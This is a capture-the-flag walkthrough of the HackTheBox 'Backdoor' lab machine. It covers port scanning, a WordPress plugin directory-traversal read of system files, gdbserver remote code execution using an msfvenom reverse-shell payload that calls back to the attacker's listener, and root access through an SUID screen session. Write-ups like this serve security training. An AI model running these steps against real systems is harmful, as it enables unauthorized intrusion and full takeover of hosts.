## Default Information
IP Address: 10.129.106.84\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.129.106.84    backdoor.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo masscan -p1-65535,U:1-65535 10.129.106.84 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-11-22 12:44:12 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.129.106.84                                   
Discovered open port 1337/tcp on 10.129.106.84                                 
Discovered open port 80/tcp on 10.129.106.84 
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port. From the output, we realize that there is a weird port 1337 with a ```waste?``` service. This might be a port running an internal service, so we would have to find out what is being executed on port 1337

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | Open |
| 80 | HTTP | Apache/2.4.41 (Ubuntu) | Open |
| 1337	| waste? | NIL | Open |

### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http:/backdoor.htb

```
http://10.129.106.84:80/index.php            (Status: 301) [Size: 0] [--> http://10.129.106.84:80/]
http://10.129.106.84:80/license.txt          (Status: 200) [Size: 19915]
http://10.129.106.84:80/readme.html          (Status: 200) [Size: 7346]
http://10.129.106.84:80/wp-content           (Status: 301) [Size: 319] [--> http://10.129.106.84/wp-content/]
http://10.129.106.84:80/wp-admin             (Status: 301) [Size: 317] [--> http://10.129.106.84/wp-admin/]
http://10.129.106.84:80/wp-config.php        (Status: 200) [Size: 0]
http://10.129.106.84:80/wp-includes          (Status: 301) [Size: 320] [--> http://10.129.106.84/wp-includes/]
http://10.129.106.84:80/wp-trackback.php     (Status: 200) [Size: 135]
http://10.129.106.84:80/wp-login.php         (Status: 200) [Size: 5758]
http://10.129.106.84:80/xmlrpc.php           (Status: 405) [Size: 42]
http://10.129.106.84:80/wp-links-opml.php    (Status: 200) [Size: 223]
```

### Web-content discovery
Knowing that this is a wordpress site, we will navigate to http://backdoor.htb/wp-content/plugins to look for vulnerable plugins that we could exploit. From the site, we that there is an ebook-download plugin.

![Wordpress plugins](https://github.com/joelczk/writeups/blob/main/HTB/Images/Backdoor/wp_plugin.png)

Viewing the files in the ebook-download directory, we discover a readme.txt which tells us that the version of ebook-download used is 1.1. From [exploit-db](https://www.exploit-db.com/exploits/39575), we can see that this plugin is vulnerable to directory traversal.

This vulnerability can be furthur exploited to become a LFI by using /etc/passwd as a payload

![LFI](https://github.com/joelczk/writeups/blob/main/HTB/Images/Backdoor/lfi.png)

Recalling that we found that we have a port 1337 of unknown service that we have found from our nmap scan. Using this information, we will bruteforce /proc/*/cmdline using intruder ion Burp Suite to check if we can find any background processes that are running on port 1337.

On PID 957, we can see that gdb server is being executed on the localhost of port 1337

![GDB Server](https://github.com/joelczk/writeups/blob/main/HTB/Images/Backdoor/gdb_server.png)

## Exploit
### Exploiting gdbserver
With some research from [here](https://security.tencent.com/index.php/blog/msg/137), we know that we are able to obtain an RCE using gdbserver. However, we would need to know 2 pieces of information before we carry out the rce:
- Architecture of the server (i.e. whether this is an x86 or x64)
- Operating System of the server (i.e. Linux/BSD/Windows)
- Low-privilege user on the server

The low-privilege user is revealed to be ```user```, which was shown when we use the LFI to read the /etc/passwd file

![Finding the low-privileged user](https://github.com/joelczk/writeups/blob/main/HTB/Images/Backdoor/user.png)

To find the operating system of the server, we will make use of LFI again to read the /proc/version file. From the output, we can see that this server is running on Linux. Apart from that, we can also find the architecture of this server. In the output, we can see that this server build is on ```amd64``` which tells us that that the server is running on a 64-bit CPU.

![Operating System](https://github.com/joelczk/writeups/blob/main/HTB/Images/Backdoor/operating_system.png)

Another way to find the architecture of the serveris to make use of the LFI again to read the /proc/cpuinfo file and check the flags. From the flags, we can find a ```lm``` flag which means that this is running on a 64-bit CPU.

![CPU Info file](https://github.com/joelczk/writeups/blob/main/HTB/Images/Backdoor/cpu_info.png)

Next, we will move on to generate a reverse shell elf using msfvenom

```
┌──(kali㉿kali)-[~]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.19 LPORT=443 -f elf -o rev.elf
```

Lastly, we will exploit gdbserver to obtain our rce. This is done by first connecting to the gdb server on 10.129.106.84:1337. Afterwards, we will put the rev.elf generated earlier onto our /home/user directory. Lastly, we will then execute the rev.elf to obtain the reverse shell.

```
target extend-remote 10.129.106.84:1337
cd /home/kali/rev.elf
remote put rev.elf rev.elf
set remote-exec rev.elf /home/user/rev.elf
run
```
### Obtaining user flag
All that we have to do now is to spawn a bash shell and obtain the user flag.

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.19] from (UNKNOWN) [10.129.106.84] 58160
python3 -c 'import pty; pty.spawn("/bin/bash")'
user@Backdoor:/home/user$ cat user.txt
cat user.txt
<Redacted user flag>
```
### Exploiting screen

Using LinEnum privilege escalation, we realized that /usr/bin/screen is set with an SUID bit

```
[-] SUID files:
-rwsr-xr-- 1 root messagebus 51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 22840 May 26 11:50 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 473576 Jul 23 12:55 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 68208 Jul 14 22:08 /usr/bin/passwd
-rwsr-xr-x 1 root root 85064 Jul 14 22:08 /usr/bin/chfn
-rwsr-xr-x 1 root root 88464 Jul 14 22:08 /usr/bin/gpasswd
-rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at
-rwsr-xr-x 1 root root 67816 Jul 21  2020 /usr/bin/su
-rwsr-xr-x 1 root root 166056 Jan 19  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root 44784 Jul 14 22:08 /usr/bin/newgrp
-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 474280 Feb 23  2021 /usr/bin/screen
-rwsr-xr-x 1 root root 39144 Jul 21  2020 /usr/bin/umount
-rwsr-xr-x 1 root root 55528 Jul 21  2020 /usr/bin/mount
-rwsr-xr-x 1 root root 53040 Jul 14 22:08 /usr/bin/chsh
-rwsr-xr-x 1 root root 31032 May 26 11:50 /usr/bin/pkexec
```

Since we know that ```screen``` has an SUID bit, we can exploit it to get a root shell. To do this, we will use the ```-x``` flag to a attach non-detached screen session. However, we will add a ```root/root``` to specify that we are going to use the screen session with root privileges.

```
user@Backdoor:/home/user$ screen -x root/root
root@Backdoor:~# id
id
uid=0(root) gid=0(root) groups=0(root) 
```

### Obtaining root flag

```
root@Backdoor:~# cat root.txt
cat root.txt
<Redacted root flag>
root@Backdoor:~#
```
